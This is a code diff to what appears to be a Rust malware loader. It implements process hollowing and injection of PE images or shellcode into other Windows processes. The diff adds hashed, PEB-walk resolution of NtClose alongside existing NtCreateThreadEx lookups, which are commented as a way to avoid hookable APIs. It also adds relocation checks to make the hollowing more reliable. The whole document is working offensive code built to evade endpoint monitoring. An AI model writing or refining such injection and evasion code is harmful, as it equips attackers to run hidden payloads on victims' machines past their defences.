@@ -20,6 +20,23 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     use winapi::um::handleapi::CloseHandle;
     use winapi::shared::basetsd::SIZE_T;
 
+    // Resolve NtClose once; fall back to CloseHandle if unavailable
+    let nt_close_addr = unsafe {
+        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
+            .and_then(|base| pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0")))
+    };
+    macro_rules! close_handle {
+        ($h:expr) => {
+            if let Some(addr) = nt_close_addr {
+                type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
+                let nt_close: NtCloseFn = std::mem::transmute(addr as *const ());
+                nt_close($h);
+            } else {
+                CloseHandle($h);
+            }
+        }
+    }
+
     if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
         return Err(anyhow!("hollow_and_execute: payload is not a PE (no MZ header)"));
     }
@@ -155,6 +172,16 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
 
         let delta = remote_base as isize - preferred_base as isize;
         if delta != 0 {
+            // Refuse to proceed if the PE has no relocation directory — applying
+            // it at the wrong base without fixups will crash the hollowed process.
+            let reloc_dir = &(*nt).OptionalHeader
+                .DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
+            if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
+                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
+                close_handle!(pi.hThread);
+                close_handle!(pi.hProcess);
+                return Err(anyhow!("hollow_and_execute: VirtualAllocEx at preferred base failed and PE has no relocation directory; cannot fix up"));
+            }
             apply_relocations_remote(pi.hProcess, remote_base, nt, payload, delta)?;
         }
 
@@ -179,8 +206,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         SetThreadContext(pi.hThread, &ctx);
         ResumeThread(pi.hThread);
 
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        close_handle!(pi.hThread);
+        close_handle!(pi.hProcess);
     }
     Ok(())
 }
@@ -254,10 +281,27 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             ));
         }
 
+        // Resolve NtClose for handle cleanup; fall back to CloseHandle
+        let ntdll_base2 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).unwrap_or(0);
+        let nt_close_addr2 = if ntdll_base2 != 0 {
+            pe_resolve::get_proc_address_by_hash(ntdll_base2, pe_resolve::hash_str(b"NtClose\0"))
+        } else { None };
+        macro_rules! close_h {
+            ($h:expr) => {
+                if let Some(addr) = nt_close_addr2 {
+                    type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
+                    let f: NtCloseFn = std::mem::transmute(addr as *const ());
+                    f($h);
+                } else {
+                    CloseHandle($h);
+                }
+            }
+        }
+
         // Resolve NtCreateThreadEx via PEB walk to avoid hookable CreateRemoteThread
         let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).unwrap_or(0);
         if ntdll_base == 0 {
-            CloseHandle(hprocess);
+            close_h!(hprocess);
             return Err(anyhow!("inject_into_process: ntdll not found"));
         }
         let ntcreate_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtCreateThreadEx\0"))
@@ -273,14 +317,14 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
         if is_pe {
             let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
             if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
-                CloseHandle(hprocess);
+                close_h!(hprocess);
                 return Err(anyhow!("inject_into_process: invalid DOS magic"));
             }
             let nt = (payload.as_ptr() as usize + (*dos).e_lfanew as usize)
                 as *const IMAGE_NT_HEADERS64;
 
             if (*nt).Signature != IMAGE_NT_SIGNATURE {
-                CloseHandle(hprocess);
+                close_h!(hprocess);
                 return Err(anyhow!("inject_into_process: invalid NT signature"));
             }
 
@@ -296,7 +340,7 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             } else { remote_mem };
 
             if remote_mem.is_null() {
-                CloseHandle(hprocess);
+                close_h!(hprocess);
                 return Err(anyhow!("VirtualAllocEx(pid={}) failed", pid));
             }
 
@@ -334,17 +378,17 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             let mut h_thread: *mut c_void = null_mut();
             let status = nt_create_thread(&mut h_thread, 0x1FFFFF, null_mut(), hprocess, entry, null_mut(), 0, 0, 0, 0, null_mut());
             if status < 0 || h_thread.is_null() {
-                CloseHandle(hprocess);
+                close_h!(hprocess);
                 return Err(anyhow!("NtCreateThreadEx(pid={}) failed: {:x}", pid, status));
             }
-            CloseHandle(h_thread);
+            close_h!(h_thread);
         } else {
             // Shellcode injection — allocate RW, write, protect RX, then thread
             let remote_mem = VirtualAllocEx(
                 hprocess, null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
             );
             if remote_mem.is_null() {
-                CloseHandle(hprocess);
+                close_h!(hprocess);
                 return Err(anyhow!("VirtualAllocEx(shellcode, pid={}) failed", pid));
             }
             let mut written: SIZE_T = 0;
@@ -354,13 +398,13 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             let mut h_sc_thread: *mut c_void = null_mut();
             let sc_status = nt_create_thread(&mut h_sc_thread, 0x1FFFFF, null_mut(), hprocess, remote_mem, null_mut(), 0, 0, 0, 0, null_mut());
             if sc_status < 0 || h_sc_thread.is_null() {
-                CloseHandle(hprocess);
+                close_h!(hprocess);
                 return Err(anyhow!("NtCreateThreadEx(shellcode, pid={}) failed: {:x}", pid, sc_status));
             }
-            CloseHandle(h_sc_thread);
+            close_h!(h_sc_thread);
         }
 
-        CloseHandle(hprocess);
+        close_h!(hprocess);
     }
     Ok(())
 }
